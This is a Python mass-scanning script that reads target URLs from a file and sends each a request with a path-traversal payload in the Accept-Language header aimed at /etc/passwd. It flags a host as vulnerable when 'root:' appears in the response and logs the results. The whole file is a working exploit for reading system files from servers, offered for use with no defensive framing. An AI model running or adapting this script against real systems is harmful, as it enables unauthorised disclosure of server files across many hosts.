import datetime
import requests

def check_vulnerability(url, results_file):
    headers = {"User-Agent": "Mozilla/5.0", "Accept-Language": "../../../../../../../etc/passwd{{", "Connection": "close"}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200 and "root:" in response.text:
            print("[+] {} is vulnerable".format(url))
            results_file.write("[{}] {} is vulnerable\n".format(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
            return True
        else:
            print("[-] {} is not vulnerable".format(url))
            results_file.write("[{}] {} is not vulnerable\n".format(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
            return False
    except:
        print("[-] Failed to connect to {}".format(url))
        results_file.write("[{}] Failed to connect to {}\n".format(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
        return False

if __name__ == "__main__":
    filename = input("Enter the filename: ")
    try:
        with open(filename) as f, open('results.txt', 'a') as results_file:
            urls = f.readlines()
            urls = [url.strip() for url in urls]
            for url in urls:
                check_vulnerability(url, results_file)
    except:
        print("[-] Failed to open file {}".format(filename))
        exit(1)